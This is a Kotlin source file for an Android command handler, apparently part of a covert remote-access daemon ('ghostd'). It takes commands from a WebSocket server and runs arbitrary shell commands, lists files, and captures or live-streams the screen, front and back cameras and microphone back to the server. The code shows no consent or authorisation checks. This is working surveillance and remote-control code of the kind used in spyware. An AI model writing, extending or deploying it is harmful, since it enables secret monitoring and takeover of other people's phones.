package com.tg.ghostd

import android.content.Context
import com.neovisionaries.ws.client.WebSocket
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * Executes commands received over the WebSocket and sends back the result.
 *
 * Protocol (matches server/daemon.py):
 *   in:  {"type":"cmd","cmd_id":..,"action":..,"args":[..]}
 *   out: {"type":"result","cmd_id":..,"id":..,"status":"ok"|"error",
 *         "ok":bool,"result":..}
 *
 * Streamed media (screen live/record, cam live, mic live) additionally uses
 * binary frames framed as: "<json header>\n<payload>" — see [MediaBus].
 */
object CommandHandler {

    @Volatile private var appContext: Context? = null

    /** Called once from GhostService.onCreate. */
    fun init(ctx: Context) {
        appContext = ctx.applicationContext
    }

    fun handle(ws: WebSocket, text: String) {
        val msg = try {
            JSONObject(text)
        } catch (_: Exception) {
            return
        }
        if (msg.optString("type") != "cmd") return
        val cmdId = msg.optString("cmd_id")
        // execute off the websocket thread
        Thread {
            val resp = try {
                execute(msg, ws).put("cmd_id", cmdId).put("id", cmdId)
            } catch (e: Exception) {
                error(cmdId, e.message ?: "error")
            }
            try {
                ws.sendText(resp.toString())
            } catch (_: Exception) {
                // socket died; reconnect loop will handle it
            }
        }.start()
    }

    private fun execute(msg: JSONObject, ws: WebSocket): JSONObject {
        val action = msg.optString("action")
        val args = msg.optJSONArray("args") ?: JSONArray()
        val ctx = appContext ?: throw Exception("service context not ready")
        val result: Any = when (action) {
            "shell" -> shell(args.optString(0, "id"))
            "files" -> filesLs(args)
            "screen" -> screenCmd(ctx, ws, args)
            "cam" -> camCmd(ctx, ws, args)
            "mic" -> micCmd(ctx, ws, args)
            "brightness" -> brightnessCmd(ctx, args)
            "volume" -> volumeCmd(ctx, args)
            "wake" -> SystemControl.wake(ctx)
            else -> throw Exception("unknown action: $action")
        }
        return JSONObject()
            .put("type", "result")
            .put("status", "ok").put("ok", true).put("result", result)
    }

    // ---------------------------------------------------------------- screen

    /**
     * screen shot
     * screen record <secs> [--fps N] [--quality 10-100]
     * screen live [--fps N] [--quality 10-100]   (a.k.a. screen start)
     * screen stop   — stop an active stream
     * screen off    — also stop the MediaProjection itself
     */
    private fun screenCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 1)
        return when (sub) {
            "shot" -> ScreenCapturer.shot(ctx, ws)
            "record" -> {
                val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 600)
                ScreenCapturer.stream(
                    ctx, ws, secs,
                    o["fps"]?.toIntOrNull(), o["quality"]?.toIntOrNull(),
                    "screen-record"
                )
            }
            "live", "start" -> ScreenCapturer.stream(
                ctx, ws, null,
                o["fps"]?.toIntOrNull(), o["quality"]?.toIntOrNull(),
                "screen-live"
            )
            "stop" -> ScreenCapturer.stop()
            "off" -> {
                ScreenCapturer.requestStopOnly()
                ProjectionHub.stop()
                JSONObject().put("projection", "stopped")
            }
            else -> throw Exception("screen: expected shot|record|live|stop|off")
        }
    }

    // ------------------------------------------------------------------- cam

    /**
     * cam snap <front|back>
     * cam live <front|back> [--quality low|med|high|480p|720p|1080p] [--fps N]
     * cam stop
     */
    private fun camCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 2)
        return when (sub) {
            "snap" -> CameraCapturer.snap(ctx, facing(args, 1))
            "live", "start" -> CameraCapturer.live(
                ctx, ws, facing(args, 1), o["quality"], o["fps"]?.toIntOrNull()
            )
            "stop" -> CameraCapturer.stop()
            else -> throw Exception("cam: expected snap|live|stop")
        }
    }

    private fun facing(args: JSONArray, idx: Int): String {
        val f = args.optString(idx, "back")
        return if (f == "front") "front" else "back"
    }

    // ------------------------------------------------------------------- mic

    /**
     * mic record <secs> [--rate N] [--mono]   (default 44100 stereo)
     * mic live
     * mic stop
     */
    private fun micCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 2)
        return when (sub) {
            "record" -> {
                val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 60)
                val rate = (o["rate"]?.toIntOrNull() ?: 44_100).coerceIn(8_000, 48_000)
                val channels = if (o.containsKey("mono")) 1 else 2
                MicCapturer.record(ctx, secs, rate, channels)
            }
            "live", "start" -> MicCapturer.live(ctx, ws)
            "stop" -> MicCapturer.stop()
            else -> throw Exception("mic: expected record|live|stop")
        }
    }

    // ------------------------------------------------------- brightness/volume

    /**
     * brightness get | brightness set <0-255>
     */
    private fun brightnessCmd(ctx: Context, args: JSONArray): Any {
        return when (args.optString(0, "get")) {
            "get" -> SystemControl.brightnessGet(ctx)
            "set" -> SystemControl.brightnessSet(
                ctx, args.optString(1, "128").toIntOrNull() ?: 128
            )
            else -> throw Exception("brightness: expected get|set <0-255>")
        }
    }

    /**
     * volume get <stream> | volume set <stream> <0-100> |
     * volume mute <stream> | volume unmute <stream>
     * stream: ring|media|alarm|notification|system
     */
    private fun volumeCmd(ctx: Context, args: JSONArray): Any {
        val sub = args.optString(0, "")
        return when (sub) {
            "get" -> SystemControl.volumeGet(ctx, args.optString(1, "media"))
            "set" -> SystemControl.volumeSet(
                ctx, args.optString(1, "media"),
                args.optString(2, "50").toIntOrNull() ?: 50
            )
            "mute" -> SystemControl.volumeMute(ctx, args.optString(1, "media"), true)
            "unmute" -> SystemControl.volumeMute(ctx, args.optString(1, "media"), false)
            else -> throw Exception("volume: expected get|set|mute|unmute <stream>")
        }
    }

    // ------------------------------------------------------------------ util

    /** Parse "--key value" options out of args starting at [from]. */
    private fun opts(args: JSONArray, from: Int): Map<String, String> {
        val m = HashMap<String, String>()
        var i = maxOf(from, 0)
        while (i < args.length()) {
            val a = args.optString(i)
            if (a.startsWith("--")) {
                if (i + 1 < args.length() && !args.optString(i + 1).startsWith("--")) {
                    m[a.substring(2)] = args.optString(i + 1)
                    i += 2
                } else {
                    m[a.substring(2)] = ""
                    i++
                }
            } else i++
        }
        return m
    }

    /** files ls: args = ["ls", "<path>"] (path defaults to /sdcard/Download). */
    private fun filesLs(args: JSONArray): JSONArray {
        val path = if (args.length() > 1 && args.optString(0) == "ls") args.optString(1)
        else if (args.length() > 0) args.optString(0)
        else "/sdcard/Download"
        val dir = File(path)
        if (!dir.exists()) throw Exception("no such file or directory: $path")
        val out = JSONArray()
        val files = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name })) ?: return out
        for (f in files) {
            out.put(
                JSONObject()
                    .put("name", f.name)
                    .put("path", f.absolutePath)
                    .put("dir", f.isDirectory)
                    .put("size", f.length())
            )
        }
        return out
    }

    /** shell: run `sh -c <command>`, capture rc/stdout/stderr. */
    private fun shell(command: String): JSONObject {
        val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
        val stdout = proc.inputStream.bufferedReader().readText()
        val stderr = proc.errorStream.bufferedReader().readText()
        val rc = try {
            proc.waitFor()
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
            -1
        }
        return JSONObject().put("rc", rc).put("stdout", stdout).put("stderr", stderr)
    }

    private fun error(cmdId: String, message: String): JSONObject = JSONObject()
        .put("type", "result").put("cmd_id", cmdId).put("id", cmdId)
        .put("status", "error").put("ok", false).put("result", message)
}
